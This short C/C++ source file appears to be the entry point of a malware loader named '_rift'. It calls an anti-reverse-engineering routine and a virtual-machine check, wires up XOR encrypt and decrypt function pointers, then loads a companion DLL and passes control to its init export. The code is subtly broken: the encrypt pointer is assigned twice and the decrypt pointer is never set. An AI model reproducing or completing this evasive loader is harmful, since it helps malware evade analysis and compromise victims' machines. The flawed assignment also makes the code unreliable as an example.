#include "pch.h"
#include "_rift.h"

WCHAR g_wcsMFN[MAX_PATH];
WCHAR g_wcsCD[MAX_PATH];

typedef BOOL (*pfnDllInit)(pEpTDll pData);

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     lpCmdLine,
	_In_     INT       nCmdShow
) {
	fnAntiRE();
	BOOL bVM = fnCheckforVM();

	GetModuleFileNameW(hInstance, g_wcsMFN, sizeof(g_wcsMFN) / sizeof(*g_wcsMFN));
	GetCurrentDirectoryW(sizeof(g_wcsCD) / sizeof(*g_wcsCD), g_wcsCD);

	sEpTDll sData;
	sData.g_wcsMFN = &g_wcsMFN;
	sData.g_wcsCD = &g_wcsCD;
	sData.pfnXorEncrypt = fnXorEncrypt;
	sData.pfnXorEncrypt = fnXorDecrypt;

	HMODULE hDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!hDll)
		return 1;

	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(hDll, "fnDllInit");
	fnDllInit(&sData);

	FreeLibrary(hDll);
	return 0;
}